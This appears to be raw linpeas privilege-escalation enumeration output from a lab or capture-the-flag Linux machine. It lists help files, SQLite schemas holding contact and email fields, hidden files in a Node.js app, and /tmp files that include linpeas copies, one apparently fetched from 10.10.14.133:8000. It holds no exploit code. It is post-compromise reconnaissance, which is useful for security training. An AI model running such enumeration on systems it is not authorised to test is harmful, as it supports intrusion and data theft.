-rw-r--r-- 1 root root 3504 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-thinkabout.page                                                               
-rw-r--r-- 1 root root 1934 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-check.page                                                                    
-rw-r--r-- 1 root root 2431 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-where.page                                                                    
-rw-r--r-- 1 root root 2513 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-how.page                                                                      
-rw-r--r-- 1 root root 2320 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-frequency.page                                                                
-rw-r--r-- 1 root root 1373 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-why.page                                                                      
-rw-r--r-- 1 root root 2705 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1517 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3659 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1985 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2494 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2688 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2351 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1472 Dec  7  2020 /usr/share/help/pt/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2767 Dec  7  2020 /usr/share/help/da/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1563 Dec  7  2020 /usr/share/help/da/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3561 Dec  7  2020 /usr/share/help/da/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2056 Dec  7  2020 /usr/share/help/da/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2538 Dec  7  2020 /usr/share/help/da/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2593 Dec  7  2020 /usr/share/help/da/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2258 Dec  7  2020 /usr/share/help/da/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1538 Dec  7  2020 /usr/share/help/da/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3073 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1956 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4109 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2478 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2917 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3158 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2719 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1957 Dec  7  2020 /usr/share/help/nl/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3692 Dec  7  2020 /usr/share/help/es/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2404 Dec  7  2020 /usr/share/help/es/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4698 Dec  7  2020 /usr/share/help/es/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2941 Dec  7  2020 /usr/share/help/es/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3442 Dec  7  2020 /usr/share/help/es/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3592 Dec  7  2020 /usr/share/help/es/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3269 Dec  7  2020 /usr/share/help/es/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2426 Dec  7  2020 /usr/share/help/es/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2876 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1804 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3855 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2310 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2938 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2886 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2520 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1854 Dec  7  2020 /usr/share/help/pl/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2505 Dec  7  2020 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1320 Dec  7  2020 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3330 Dec  7  2020 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1815 Dec  7  2020 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2294 Dec  7  2020 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2356 Dec  7  2020 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2013 Dec  7  2020 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1262 Dec  7  2020 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3143 Dec  7  2020 /usr/share/help/it/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1830 Dec  7  2020 /usr/share/help/it/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3990 Dec  7  2020 /usr/share/help/it/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2316 Dec  7  2020 /usr/share/help/it/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2962 Dec  7  2020 /usr/share/help/it/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2934 Dec  7  2020 /usr/share/help/it/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2672 Dec  7  2020 /usr/share/help/it/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1906 Dec  7  2020 /usr/share/help/it/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2546 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1362 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3365 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1856 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2335 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2397 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2054 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1302 Dec  7  2020 /usr/share/help/kn/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4826 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2646 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4593 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2966 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3675 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4265 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3780 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2563 Dec  7  2020 /usr/share/help/mr/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2546 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1362 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3365 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1856 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2335 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2397 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2054 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1302 Dec  7  2020 /usr/share/help/hr/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3431 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2242 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4250 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2703 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3259 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3265 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2907 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2153 Dec  7  2020 /usr/share/help/sv/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4037 Dec  7  2020 /usr/share/help/hu/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2956 Dec  7  2020 /usr/share/help/hu/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4973 Dec  7  2020 /usr/share/help/hu/gnome-help/backup-thinkabout.page

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/alternatives/regulatory.db: symbolic link to /lib/firmware/regulatory.db-debian                                                                        
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3034001
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3034001
Found /var/lib/dpkg/alternatives/regulatory.db: ASCII text
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3034001
Found /var/lib/gdm3/.cache/tracker/meta.db: SQLite 3.x database, last written using SQLite version 3034001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3034001

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
                                                                                 

 -> Extracting tables from /var/lib/colord/storage.db (limit 20)
                                                                                 


 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                 



 -> Extracting tables from /var/lib/gdm3/.cache/tracker/meta.db (limit 20)
                                                                                 


  --> Found interesting column names in nco:Role_nco:hasEmailAddress (output limit 10)                                                                            
CREATE TABLE "nco:Role_nco:hasEmailAddress" (ID INTEGER NOT NULL, "nco:hasEmailAddress" INTEGER NOT NULL, "nco:hasEmailAddress:graph" INTEGER)




  --> Found interesting column names in nco:EmailAddress (output limit 10)
CREATE TABLE "nco:EmailAddress" (ID INTEGER NOT NULL PRIMARY KEY, "nco:emailAddress" TEXT COLLATE TRACKER UNIQUE, "nco:emailAddress:graph" INTEGER)




  --> Found interesting column names in nco:VoicePhoneNumber (output limit 10)
CREATE TABLE "nco:VoicePhoneNumber" (ID INTEGER NOT NULL PRIMARY KEY, "nco:voiceMail" INTEGER, "nco:voiceMail:graph" INTEGER)



  --> Found interesting column names in nfo:FileDataObject (output limit 10)
CREATE TABLE "nfo:FileDataObject" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:fileLastAccessed" INTEGER, "nfo:fileLastAccessed:graph" INTEGER, "nfo:fileLastAccessed:localDate" INTEGER, "nfo:fileLastAccessed:localTime" INTEGER, "nfo:fileCreated" INTEGER, "nfo:fileCreated:graph" INTEGER, "nfo:fileCreated:localDate" INTEGER, "nfo:fileCreated:localTime" INTEGER, "nfo:fileSize" INTEGER, "nfo:fileSize:graph" INTEGER, "nfo:permissions" TEXT COLLATE TRACKER, "nfo:permissions:graph" INTEGER, "nfo:fileName" TEXT COLLATE TRACKER, "nfo:fileName:graph" INTEGER, "nfo:hasHash" INTEGER, "nfo:hasHash:graph" INTEGER, "nfo:fileOwner" INTEGER, "nfo:fileOwner:graph" INTEGER, "nfo:fileLastModified" INTEGER, "nfo:fileLastModified:graph" INTEGER, "nfo:fileLastModified:localDate" INTEGER, "nfo:fileLastModified:localTime" INTEGER)
100003, 1660030067, 100002, 19213, 26867, None, None, None, None, 4096, 100002, None, None, gdm3, 100002, None, None, None, None, 1660030061, 100002, 19213, 26861



  --> Found interesting column names in nfo:FileHash (output limit 10)
CREATE TABLE "nfo:FileHash" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:hashValue" TEXT COLLATE TRACKER, "nfo:hashValue:graph" INTEGER, "nfo:hashAlgorithm" TEXT COLLATE TRACKER, "nfo:hashAlgorithm:graph" INTEGER)





  --> Found interesting column names in nfo:ArchiveItem (output limit 10)
CREATE TABLE "nfo:ArchiveItem" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:isPasswordProtected" INTEGER, "nfo:isPasswordProtected:graph" INTEGER)



  --> Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)                                                                           
CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentMimeType" TEXT NOT NULL, "nmo:contentMimeType:graph" INTEGER)

  --> Found interesting column names in nmo:Email (output limit 10)
CREATE TABLE "nmo:Email" (ID INTEGER NOT NULL PRIMARY KEY, "nmo:hasContent" INTEGER, "nmo:hasContent:graph" INTEGER, "nmo:isFlagged" INTEGER, "nmo:isFlagged:graph" INTEGER, "nmo:isRecent" INTEGER, "nmo:isRecent:graph" INTEGER, "nmo:status" TEXT COLLATE TRACKER, "nmo:status:graph" INTEGER, "nmo:responseType" TEXT COLLATE TRACKER, "nmo:responseType:graph" INTEGER)





  --> Found interesting column names in ncal:UnionParentClass (output limit 10)
CREATE TABLE "ncal:UnionParentClass" (ID INTEGER NOT NULL PRIMARY KEY, "ncal:lastModified" INTEGER, "ncal:lastModified:graph" INTEGER, "ncal:lastModified:localDate" INTEGER, "ncal:lastModified:localTime" INTEGER, "ncal:trigger" INTEGER, "ncal:trigger:graph" INTEGER, "ncal:created" INTEGER, "ncal:created:graph" INTEGER, "ncal:created:localDate" INTEGER, "ncal:created:localTime" INTEGER, "ncal:url" INTEGER, "ncal:url:graph" INTEGER, "ncal:comment" TEXT COLLATE TRACKER, "ncal:comment:graph" INTEGER, "ncal:summaryAltRep" INTEGER, "ncal:summaryAltRep:graph" INTEGER, "ncal:priority" INTEGER, "ncal:priority:graph" INTEGER, "ncal:location" TEXT COLLATE TRACKER, "ncal:location:graph" INTEGER, "ncal:uid" TEXT COLLATE TRACKER, "ncal:uid:graph" INTEGER, "ncal:requestStatus" INTEGER, "ncal:requestStatus:graph" INTEGER, "ncal:recurrenceId" INTEGER, "ncal:recurrenceId:graph" INTEGER, "ncal:dtstamp" INTEGER, "ncal:dtstamp:graph" INTEGER, "ncal:dtstamp:localDate" INTEGER, "ncal:dtstamp:localTime" INTEGER, "ncal:class" INTEGER, "ncal:class:graph" INTEGER, "ncal:organizer" INTEGER, "ncal:organizer:graph" INTEGER, "ncal:dtend" INTEGER, "ncal:dtend:graph" INTEGER, "ncal:summary" TEXT COLLATE TRACKER, "ncal:summary:graph" INTEGER, "ncal:descriptionAltRep" INTEGER, "ncal:descriptionAltRep:graph" INTEGER, "ncal:commentAltRep" INTEGER, "ncal:commentAltRep:graph" INTEGER, "ncal:sequence" INTEGER, "ncal:sequence:graph" INTEGER, "ncal:contact" TEXT COLLATE TRACKER, "ncal:contact:graph" INTEGER, "ncal:contactAltRep" INTEGER, "ncal:contactAltRep:graph" INTEGER, "ncal:locationAltRep" INTEGER, "ncal:locationAltRep:graph" INTEGER, "ncal:geo" INTEGER, "ncal:geo:graph" INTEGER, "ncal:resourcesAltRep" INTEGER, "ncal:resourcesAltRep:graph" INTEGER, "ncal:dtstart" INTEGER, "ncal:dtstart:graph" INTEGER, "ncal:description" TEXT COLLATE TRACKER, "ncal:description:graph" INTEGER, "ncal:relatedToSibling" TEXT COLLATE TRACKER, "ncal:relatedToSibling:graph" INTEGER, "ncal:duration" INTEGER, "ncal:duration:graph" INTEGER)



  --> Found interesting column names in fts5 (output limit 10)
CREATE VIRTUAL TABLE fts5 USING fts5(content="fts_view", "nco:phoneNumber", "nfo:fontFamily", "nmm:artistName", "nfo:tableOfContents", "nfo:fileName", "nmo:messageSubject", "nfo:genre", "nmm:genre", "mtp:creator", "nco:title", "nco:emailAddress", "nie:keyword", "nmm:category", "nid3:title", "nid3:albumTitle", "nid3:contentType", "nco:nameFamily", "nco:nameGiven", "nco:nameAdditional", "nco:contactGroupName", "nco:fullname", "nco:nickname", "nco:region", "nco:country", "nco:extendedAddress", "nco:streetAddress", "nco:postalcode", "nco:locality", "nco:county", "nco:district", "nco:pobox", "nco:imID", "nco:imNickname", "ncal:comment", "ncal:location", "ncal:summary", "ncal:contact", "ncal:description", "nie:title", "nie:subject", "nie:plainTextContent", "nie:description", "nie:comment", "nao:prefLabel", "nao:description", "nco:department", "nco:role", "nco:note", "nmm:albumTitle", tokenize=TrackerTokenizer)





 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                 




╔══════════╣ Web files?(output limit)
/var/www/:                                                                       
total 12K
drwxr-xr-x  3 root root 4.0K Jul 22 12:30 .
drwxr-xr-x 12 root root 4.0K Jul 22 12:30 ..
drwxr-xr-x  2 root root 4.0K Jul 22 12:30 html

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Jul 22 12:30 .
drwxr-xr-x 3 root root 4.0K Jul 22 12:30 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                  
-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw------- 1 postgres postgres 68 Nov  8 12:55 /run/postgresql/.s.PGSQL.5432.lock
-rw-r--r-- 1 root root 0 Nov  8 04:13 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Mar 27  2022 /etc/skel/.bash_logout
-rw------- 1 root root 0 Jul 22 11:24 /etc/.pwd.lock
-rw-r--r-- 1 deploy deploy 220 Mar 27  2022 /home/deploy/.bash_logout
-rw-r--r-- 1 jaeger jaeger 220 Jul 22 11:39 /home/jaeger/.bash_logout
-rw-r--r-- 1 jaeger jaeger 0 May 17 01:00 /home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/.npmrc
-rw-r--r-- 1 jaeger jaeger 38 May 17 01:00 /home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/node_modules/qrcode-terminal/.travis.yml
-rw-r--r-- 1 jaeger jaeger 121 May 17 01:00 /home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/node_modules/node-gyp/gyp/.flake8
-rw------- 1 jaeger jaeger 0 Jul 22 15:55 /home/jaeger/.mongorc.js
-rw-r--r-- 1 jaeger jaeger 242 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/estraverse/.jshintrc
-rw-r--r-- 1 jaeger jaeger 2329 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/mquery/.eslintrc.json
-rw-r--r-- 1 jaeger jaeger 9 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/mquery/.eslintignore
-rw-r--r-- 1 jaeger jaeger 18 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/mquery/test/.eslintrc.yml
-rw-r--r-- 1 jaeger jaeger 336 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/mquery/.travis.yml
-rw-r--r-- 1 jaeger jaeger 33 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/vm2/.eslintignore
-rw-r--r-- 1 jaeger jaeger 213 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/vm2/.eslintrc.js
-rw-r--r-- 1 jaeger jaeger 107 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/vizion/.travis.yml
-rw-r--r-- 1 jaeger jaeger 422 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/continuation-local-storage/.eslintrc
-rw-r--r-- 1 jaeger jaeger 119 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/continuation-local-storage/.travis.yml
-rw-r--r-- 1 jaeger jaeger 230 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/fclone/.travis.yml
-rw-r--r-- 1 jaeger jaeger 173 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/saslprep/.editorconfig
-rw-r--r-- 1 jaeger jaeger 113 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/saslprep/.travis.yml
-rw-r--r-- 1 jaeger jaeger 377 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/asn1.js/.eslintrc.js
-rw-r--r-- 1 jaeger jaeger 71 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/shimmer/.travis.yml
-rw-r--r-- 1 jaeger jaeger 286 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/function-bind/.editorconfig
-rw-r--r-- 1 jaeger jaeger 176 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/function-bind/test/.eslintrc
-rw-r--r-- 1 jaeger jaeger 231 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/function-bind/.eslintrc
-rw-r--r-- 1 jaeger jaeger 5451 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/function-bind/.travis.yml
-rw-r--r-- 1 jaeger jaeger 4140 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/function-bind/.jscs.json
-rw-r--r-- 1 jaeger jaeger 139 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/supports-preserve-symlinks-flag/.nycrc
-rw-r--r-- 1 jaeger jaeger 132 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/supports-preserve-symlinks-flag/.eslintrc
-rw-r--r-- 1 jaeger jaeger 71 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/emitter-listener/.travis.yml
-rw-r--r-- 1 jaeger jaeger 63 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/module-details-from-path/.travis.yml
-rw-r--r-- 1 jaeger jaeger 84 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/smart-buffer/.prettierrc.yaml
-rw-r--r-- 1 jaeger jaeger 152 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/smart-buffer/.travis.yml
-rw-r--r-- 1 jaeger jaeger 125 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/tx2/.travis.yml
-rw-r--r-- 1 jaeger jaeger 180 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/send/node_modules/debug/.eslintrc
-rw-r--r-- 1 jaeger jaeger 46 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/send/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 jaeger jaeger 140 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/send/node_modules/debug/.travis.yml
-rw-r--r-- 1 jaeger jaeger 43 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/memory-pager/.travis.yml
-rw-r--r-- 1 jaeger jaeger 78 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/dayjs/.editorconfig
-rw-r--r-- 1 jaeger jaeger 52 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/deep-is/.travis.yml
-rw-r--r-- 1 jaeger jaeger 105123 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/.package-lock.json
-rw-r--r-- 1 jaeger jaeger 236 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/object-inspect/.nycrc
-rw-r--r-- 1 jaeger jaeger 1298 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/object-inspect/.eslintrc
-rw-r--r-- 1 jaeger jaeger 220 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/promptly/.editorconfig
-rw-r--r-- 1 jaeger jaeger 62 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/promptly/.travis.yml
-rw-r--r-- 1 jaeger jaeger 1168 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/promptly/.jshintrc
-rw-r--r-- 1 jaeger jaeger 180 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/body-parser/node_modules/debug/.eslintrc
-rw-r--r-- 1 jaeger jaeger 46 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/body-parser/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 jaeger jaeger 140 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/body-parser/node_modules/debug/.travis.yml
-rw-r--r-- 1 jaeger jaeger 139 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/get-intrinsic/.nycrc
-rw-r--r-- 1 jaeger jaeger 585 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/get-intrinsic/.eslintrc
-rw-r--r-- 1 jaeger jaeger 43 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 jaeger jaeger 207 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/socks/.eslintrc.cjs
-rw-r--r-- 1 jaeger jaeger 124 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/socks/.prettierrc.yaml
-rw-r--r-- 1 jaeger jaeger 3072 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/mongo-escape/.eslintrc.js
-rw-r--r-- 1 jaeger jaeger 10 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/side-channel/.eslintignore
-rw-r--r-- 1 jaeger jaeger 216 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/side-channel/.nycrc
-rw-r--r-- 1 jaeger jaeger 172 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/side-channel/.eslintrc
-rw-r--r-- 1 jaeger jaeger 216 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/qs/.nycrc
-rw-r--r-- 1 jaeger jaeger 540 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/qs/.editorconfig
-rw-r--r-- 1 jaeger jaeger 1022 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/qs/.eslintrc
-rw-r--r-- 1 jaeger jaeger 180 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/express/node_modules/debug/.eslintrc
-rw-r--r-- 1 jaeger jaeger 46 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/express/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 jaeger jaeger 140 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/express/node_modules/debug/.travis.yml
-rw-r--r-- 1 jaeger jaeger 139 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/has-symbols/.nycrc
-rw-r--r-- 1 jaeger jaeger 164 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/has-symbols/.eslintrc

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                             
-rwxr-xr-x 1 deploy deploy 1513 Nov  8 13:01 /tmp/linpeas.sh                     
-rw-r--r-- 1 deploy deploy 777018 Nov  8 12:58 /tmp/10.10.14.133:8000/linpeas.sh
-rwxr-xr-x 1 deploy deploy 777018 Nov  8 12:58 /tmp/linpeas.sh.1
-rw-r--r-- 1 root root 335784 Jul 22 14:06 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 252 Jul 22 14:05 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 1380568 Sep 12 13:36 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 7718 Jul 26 06:34 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 155 Jul 22 11:37 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 335198 Jul 26 06:34 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 156 Jul 22 14:05 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 172 Jul 22 11:37 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 6819 Jul 23 02:33 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 147 Jul 22 11:39 /var/backups/dpkg.diversions.4.gz
-rw-r--r-- 1 root root 335206 Aug  9 09:38 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 69226 Sep 12 13:36 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 156 Jul 22 14:05 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 155 Jul 22 11:37 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 102400 Nov  8 04:18 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 155 Jul 22 11:37 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 156 Jul 22 14:05 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 155 Jul 22 11:37 /var/backups/dpkg.statoverride.4.gz
-rw-r--r-- 1 root root 32 Aug  7 03:10 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 32 Aug 10 04:57 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 4000 Jul 22 11:50 /var/backups/alternatives.tar.2.gz
